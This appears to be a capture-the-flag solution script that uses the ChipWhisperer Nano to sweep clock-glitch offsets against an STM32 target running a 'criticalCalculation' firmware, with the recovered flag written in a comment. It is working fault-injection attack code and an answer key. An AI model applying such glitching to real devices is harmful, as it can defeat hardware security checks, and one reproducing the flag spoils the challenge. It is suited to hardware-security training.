import chipwhisperer as cw
import numpy as np
import matplotlib.pyplot as plt
import time


PLATFORM = "CWNANO"
PROG_TYPE = cw.programmers.STM32FProgrammer

TARGET_BIN_PATH = f"criticalCalculation-CWNANO.hex"

################################################################################################################################################

# Connect to the CW
scope = cw.scope()

################################################################################################################################################

# Connect to the target
target = cw.target(scope, cw.targets.SimpleSerial)

################################################################################################################################################

# Setup the scope
scope.default_setup()

scope.adc.samples = 5000

################################################################################################################################################

# Program the target
cw.program_target(scope, PROG_TYPE, TARGET_BIN_PATH)

################################################################################################################################################

def reboot_flush():            
    scope.io.nrst = False
    time.sleep(0.05)
    scope.io.nrst = "high_z"
    time.sleep(0.05)
    target.flush()

reboot_flush()

scope.glitch.repeat = 3
scope.glitch.ext_offset = 208 # 1643 # 208

### The flag is:
### bytearray(b'cc1{C0RRUPT3D_C4LCUL4T10N}')

for xx in range(205,510):
    scope.glitch.ext_offset = xx
    for j in range(100):
        target.flush()
        scope.arm()
        target.simpleserial_write('d', b'')
        scope.capture()
        response = target.simpleserial_read('r', 26, timeout=2000)
        if response == None:
            print(j)
            reboot_flush()
        elif response != bytearray(b'DIAGNOSTIC_OK             '):
            print('----------------------------------------')
            print(j, response)
            print('----------------------------------------')
        # power_trace = scope.get_last_trace()
        # plt.figure(figsize=(16,8))
        # plt.plot(power_trace[:500])
        # plt.show()
    # else:
    #     print(j, response)

    # power_trace = scope.get_last_trace()

    # plt.figure(figsize=(16,8))
    # plt.plot(power_trace[:2000])
    # plt.show()

# Disconnect the oscope and the target
scope.dis()
target.dis()

# if save_power_trace:
# np.save("power_trace_1.npy", power_trace)




